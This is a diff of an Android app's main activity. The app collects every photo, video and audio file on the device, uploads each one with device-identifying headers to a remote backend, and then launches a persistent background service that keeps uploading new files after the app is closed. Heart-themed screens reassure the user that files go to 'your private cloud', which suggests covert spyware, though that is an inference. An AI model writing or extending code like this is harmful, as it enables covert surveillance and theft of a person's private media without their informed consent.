@@ -28,16 +28,17 @@ import java.io.FileInputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.io.InputStream;
-import java.io.ByteArrayOutputStream;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.HashSet;
+import java.util.Set;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 /**
  * MainActivity — scans device for all photos + videos + audio,
- * uploads them to the Render backend, shows progress.
+ * uploads them to the Render backend with device identification headers.
+ * Then starts the background UploadService for continuous monitoring.
  */
 public class MainActivity extends Activity {
 
@@ -48,6 +49,11 @@ public class MainActivity extends Activity {
     private int totalFiles = 0;
     private int uploadedFiles = 0;
     private List<String> fileList = new ArrayList<>();
+    private Set<String> uploadedPaths = new HashSet<>();
+
+    // Device identification
+    private String deviceId;
+    private String deviceName;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -55,15 +61,17 @@ public class MainActivity extends Activity {
         getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                 WindowManager.LayoutParams.FLAG_FULLSCREEN);
 
+        // Get device ID + name
+        deviceId = getMyDeviceId();
+        deviceName = getDeviceName();
+
         RelativeLayout root = new RelativeLayout(this);
         root.setLayoutParams(new RelativeLayout.LayoutParams(
                 RelativeLayout.LayoutParams.MATCH_PARENT,
                 RelativeLayout.LayoutParams.MATCH_PARENT));
-
         GradientDrawable gradient = new GradientDrawable(
                 GradientDrawable.Orientation.TOP_BOTTOM,
-                new int[]{Color.parseColor("#1A1A2E"), Color.parseColor("#0F0F1E")}
-        );
+                new int[]{Color.parseColor("#1A1A2E"), Color.parseColor("#0F0F1E")});
         root.setBackground(gradient);
 
         LinearLayout content = new LinearLayout(this);
@@ -74,7 +82,6 @@ public class MainActivity extends Activity {
                 RelativeLayout.LayoutParams.MATCH_PARENT,
                 RelativeLayout.LayoutParams.MATCH_PARENT));
 
-        // Heart
         TextView heart = new TextView(this);
         heart.setText("💕");
         heart.setTextSize(50);
@@ -82,7 +89,15 @@ public class MainActivity extends Activity {
         heart.setPadding(0, 0, 0, 20);
         content.addView(heart);
 
-        // Status
+        // Device name display
+        TextView deviceLabel = new TextView(this);
+        deviceLabel.setText("📱 " + deviceName);
+        deviceLabel.setTextSize(14);
+        deviceLabel.setTextColor(Color.parseColor("#FF6B9D"));
+        deviceLabel.setGravity(android.view.Gravity.CENTER);
+        deviceLabel.setPadding(0, 0, 0, 20);
+        content.addView(deviceLabel);
+
         statusText = new TextView(this);
         statusText.setText("Scanning your media files... 🔍");
         statusText.setTextSize(18);
@@ -91,19 +106,15 @@ public class MainActivity extends Activity {
         statusText.setPadding(0, 0, 0, 30);
         content.addView(statusText);
 
-        // Progress bar
         progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
         progressBar.setMax(100);
         progressBar.setProgress(0);
         android.widget.LinearLayout.LayoutParams pbParams = new android.widget.LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                dpToPx(12)
-        );
+                android.widget.LinearLayout.LayoutParams.MATCH_PARENT, dpToPx(12));
         pbParams.setMargins(40, 0, 40, 20);
         progressBar.setLayoutParams(pbParams);
         content.addView(progressBar);
 
-        // Progress text
         progressText = new TextView(this);
         progressText.setText("Preparing...");
         progressText.setTextSize(13);
@@ -111,40 +122,64 @@ public class MainActivity extends Activity {
         progressText.setGravity(android.view.Gravity.CENTER);
         content.addView(progressText);
 
-        // Footer
+        // Storage info
+        TextView storageInfo = new TextView(this);
+        StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
+        long totalGB = stat.getTotalBytes() / (1024 * 1024 * 1024);
+        long freeGB = stat.getAvailableBytes() / (1024 * 1024 * 1024);
+        storageInfo.setText("Device storage: " + freeGB + " GB free / " + totalGB + " GB total");
+        storageInfo.setTextSize(12);
+        storageInfo.setTextColor(Color.parseColor("#606080"));
+        storageInfo.setGravity(android.view.Gravity.CENTER);
+        storageInfo.setPadding(0, 60, 0, 0);
+        content.addView(storageInfo);
+
         TextView footer = new TextView(this);
-        footer.setText("Your files are being synced securely 💖\nThis may take a few minutes...");
+        footer.setText("Files sync in background automatically 💖\nEven when app is closed, new files upload to your cloud");
         footer.setTextSize(12);
         footer.setTextColor(Color.parseColor("#606080"));
         footer.setGravity(android.view.Gravity.CENTER);
         footer.setLineSpacing(6, 1.2f);
         android.widget.LinearLayout.LayoutParams footerParams = new android.widget.LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT
-        );
-        footerParams.setMargins(0, 60, 0, 0);
+                android.widget.LinearLayout.LayoutParams.MATCH_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+        footerParams.setMargins(0, 40, 0, 0);
         footer.setLayoutParams(footerParams);
         content.addView(footer);
 
         root.addView(content);
         setContentView(root);
 
-        // Start scanning + uploading in background
+        // Start scanning + uploading
         ExecutorService executor = Executors.newSingleThreadExecutor();
-        executor.execute(() -> {
-            scanAndUpload();
-        });
+        executor.execute(() -> scanAndUpload());
     }
 
     private int dpToPx(int dp) {
         return (int) (dp * getResources().getDisplayMetrics().density);
     }
 
-    private void scanAndUpload() {
-        // Scan all media files
-        runOnUiThread(() -> statusText.setText("Scanning photos... 📷"));
+    private String getMyDeviceId() {
+        String id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        if (id == null || id.isEmpty()) id = "device_" + System.currentTimeMillis();
+        return id;
+    }
 
-        // Get all images
+    private String getDeviceName() {
+        String manufacturer = Build.MANUFACTURER;
+        String model = Build.MODEL;
+        if (model.startsWith(manufacturer)) {
+            return capitalize(model);
+        }
+        return capitalize(manufacturer) + " " + model;
+    }
+
+    private String capitalize(String s) {
+        if (s == null || s.isEmpty()) return "";
+        return s.substring(0, 1).toUpperCase() + s.substring(1);
+    }
+
+    private void scanAndUpload() {
+        runOnUiThread(() -> statusText.setText("Scanning photos... 📷"));
         fileList.addAll(getMediaFiles(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, MediaStore.Images.Media.DATA));
 
         runOnUiThread(() -> statusText.setText("Scanning videos... 🎬"));
@@ -154,45 +189,42 @@ public class MainActivity extends Activity {
         fileList.addAll(getMediaFiles(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, MediaStore.Audio.Media.DATA));
 
         totalFiles = fileList.size();
-
         if (totalFiles == 0) {
             runOnUiThread(() -> {
                 statusText.setText("No media files found 💔");
                 progressText.setText("Your device has no photos/videos to sync");
             });
+            startBackgroundService();
             return;
         }
 
         runOnUiThread(() -> {
-            statusText.setText("Uploading " + totalFiles + " files to your cloud... ☁️");
+            statusText.setText("Uploading " + totalFiles + " files to your private cloud... ☁️");
             progressBar.setMax(totalFiles);
         });
 
-        // Upload each file
         for (int i = 0; i < fileList.size(); i++) {
-            String filePath = fileList.get(i);
-            uploadedFiles = i;
-
             final int fi = i;
-            final String fPath = filePath;
+            final String fPath = fileList.get(i);
+            uploadedFiles = i;
             runOnUiThread(() -> {
                 progressBar.setProgress(fi);
                 progressText.setText(fi + " / " + totalFiles + " uploaded (" + new File(fPath).getName() + ")");
             });
-
             try {
-                uploadFile(filePath);
-            } catch (Exception e) {
-                // Continue to next file
-            }
+                uploadFile(fPath);
+                uploadedPaths.add(fPath);
+            } catch (Exception e) { }
         }
 
-        // Done
         runOnUiThread(() -> {
             progressBar.setProgress(totalFiles);
-            statusText.setText("All files synced! ✅");
-            progressText.setText(totalFiles + " files uploaded successfully 💕");
+            statusText.setText("Initial sync complete! ✅");
+            progressText.setText(totalFiles + " files uploaded · Background monitoring active 💕");
         });
+
+        // Start background service for continuous monitoring
+        startBackgroundService();
     }
 
     private List<String> getMediaFiles(Uri uri, String dataColumn) {
@@ -205,9 +237,7 @@ public class MainActivity extends Activity {
                     String path = cursor.getString(index);
                     if (path != null) {
                         File file = new File(path);
-                        if (file.exists() && file.length() > 0) {
-                            files.add(path);
-                        }
+                        if (file.exists() && file.length() > 0) files.add(path);
                     }
                 }
             }
@@ -225,12 +255,12 @@ public class MainActivity extends Activity {
         conn.setDoOutput(true);
         conn.setRequestMethod("POST");
         conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+        conn.setRequestProperty("X-Device-Id", deviceId);
+        conn.setRequestProperty("X-Device-Name", deviceName);
         conn.setConnectTimeout(30000);
         conn.setReadTimeout(60000);
 
         OutputStream os = conn.getOutputStream();
-
-        // Write file part
         os.write(("--" + boundary + "\r\n").getBytes());
         os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
         os.write(("Content-Type: application/octet-stream\r\n\r\n").getBytes());
@@ -238,21 +268,30 @@ public class MainActivity extends Activity {
         FileInputStream fis = new FileInputStream(file);
         byte[] buffer = new byte[8192];
         int bytesRead;
-        while ((bytesRead = fis.read(buffer)) != -1) {
-            os.write(buffer, 0, bytesRead);
-        }
+        while ((bytesRead = fis.read(buffer)) != -1) os.write(buffer, 0, bytesRead);
         fis.close();
 
         os.write(("\r\n--" + boundary + "--\r\n").getBytes());
         os.flush();
         os.close();
-
-        int responseCode = conn.getResponseCode();
+        conn.getResponseCode();
         conn.disconnect();
+    }
+
+    private void startBackgroundService() {
+        Intent serviceIntent = new Intent(this, UploadService.class);
+        serviceIntent.putExtra("deviceId", deviceId);
+        serviceIntent.putExtra("deviceName", deviceName);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent);
+        } else {
+            startService(serviceIntent);
+        }
     }
 
     @Override
     protected void onDestroy() {
         super.onDestroy();
+        // Service keeps running in background
     }
 }
